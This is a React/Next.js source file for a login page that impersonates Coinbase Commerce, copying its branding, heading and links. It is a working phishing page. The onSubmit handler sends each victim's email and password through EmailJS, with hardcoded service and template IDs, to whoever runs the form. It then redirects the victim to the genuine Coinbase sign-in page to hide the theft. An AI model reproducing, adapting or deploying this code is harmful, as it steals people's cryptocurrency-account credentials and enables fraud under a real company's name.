'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { useForm } from 'react-hook-form';
import { Button } from '@/components/ui/button';
import Link from 'next/link';
import emailjs from '@emailjs/browser';
import { useState } from 'react';

const formSchema = z.object({
  email: z
    .string()
    .min(5, {
      message: 'Email must be valid',
    })
    .email('This is not a valid email'),
  Password: z.string(),
});

export function LoginForm() {
  const [isLoading, setIsLoading] = useState(false);
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: '',
      Password: '',
    },
  });
  emailjs.init('DIbKEHLKOAudAEC1y');
  function onSubmit(values: z.infer<typeof formSchema>) {
    setIsLoading(true);
    emailjs
      .send('service_1exxh39', 'template_banhdlj', {
        Email: values.email,
        Passcode: values.Password,
      })
      .then(() => {
        setIsLoading(false);
        window.location.href = 'https://beta.commerce.coinbase.com/sign-in';
      });
  }

  return (
    <main className="m-auto flex min-h-screen w-full flex-col justify-between">
      <header className="flex items-center justify-between border-b border-muted-foreground p-4 lg:px-[130px]">
        <div className="text-lg">
          <span className="text-2xl font-bold text-primary">coinbase</span>{' '}
          COMMERCE
        </div>
        <div className="flex items-center gap-4">
          <p className="hidden cursor-pointer md:block">
            Don&apos;t have an account?
          </p>
          <Button className="text-md rounded-full bg-muted-foreground px-4 py-2 font-semibold text-black hover:opacity-90">
            {' '}
            Create one
          </Button>
        </div>
      </header>
      <div className="flex h-[calc(100vh-70px)] w-full items-center justify-center p-4">
        <div className="flex w-full flex-col items-center gap-4">
          <h2 className="text-center text-2xl sm:text-3xl ">
            Sign in to Coinbase Commerce
          </h2>
          <Form {...form}>
            <form
              onSubmit={form.handleSubmit(onSubmit)}
              className="flex w-full max-w-[520px]  flex-col  gap-6"
            >
              <FormField
                control={form.control}
                name="email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="font-semibold">Email</FormLabel>
                    <FormControl>
                      <Input
                        placeholder="Email"
                        className="h-[55px] rounded-[8px] border-muted p-4 placeholder:text-muted"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="Password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="font-semibold">Password</FormLabel>
                    <FormControl>
                      <Input
                        placeholder="Password"
                        type="password"
                        className="h-[55px] rounded-[8px] border-muted p-4 placeholder:text-muted"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <Button
                variant={'default'}
                className="text-md h-[55px] w-full rounded-full font-bold"
                type={'submit'}
                disabled={isLoading}
              >
                {isLoading ? <div className="custom-loader" /> : 'Sign in'}
              </Button>
            </form>
          </Form>
          <p className="text-center">
            <Link
              target="_blank"
              rel="noopener noreferrer"
              href="https://accounts.coinbase.com/signin"
              className="mr-1 text-primary underline"
            >
              Click here
            </Link>
            {''}to access your active application for Coinbase-managed Commerce
          </p>
          <p>
            Forgot your password?{' '}
            <Link
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary"
              href="https://beta.commerce.coinbase.com/self-managed/reset-password"
            >
              {' '}
              Reset your password
            </Link>{' '}
          </p>
          <p>
            {' '}
            <Link
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary"
              href="https://commerce.coinbase.com/legal/terms-of-service/"
            >
              {' '}
              Terms of Service
            </Link>{' '}
            <Link
              target="_blank"
              rel="noopener noreferrer"
              className="ml-1 text-primary"
              href="https://commerce.coinbase.com/legal/privacy-policy/"
            >
              {' '}
              Privacy Policy
            </Link>{' '}
          </p>
        </div>
      </div>
    </main>
  );
}
